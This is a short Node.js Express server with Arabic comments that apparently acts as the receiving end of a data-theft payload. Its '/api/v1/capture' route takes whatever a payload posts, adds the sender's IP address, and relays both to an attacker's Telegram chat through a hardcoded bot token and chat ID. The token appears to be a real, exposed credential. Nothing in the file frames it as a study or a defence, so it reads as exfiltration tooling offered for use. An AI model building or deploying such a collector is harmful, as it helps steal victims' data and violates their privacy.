const express = require('express');
const app = express();
const axios = require('axios');

const PORT = process.env.PORT || 3000;
const BOT_TOKEN = '9026070601:AAH0vKq3iQK9V8Q1XtksXQATWohRlup082A'; // حط التوكن هنا
const CHAT_ID = '7988633988'; // حط الايدي هنا

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// المسار اللي البايلود هيبعت عليه
app.post('/api/v1/capture', async (req, res) => {
    const data = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const message = `🚨 اتصال جديد!\n\n🌐 الـ IP: ${ip}\n📦 البيانات: ${JSON.stringify(data, null, 2)}`;
    
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message
        });
    } catch (e) {
        console.log('Telegram Error:', e.message);
    }
    
    res.status(200).send('OK');
});

// صفحة رئيسية للتأكد إن السيرفر شغال
app.get('/', (req, res) => {
    res.send('Gateway is running.');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
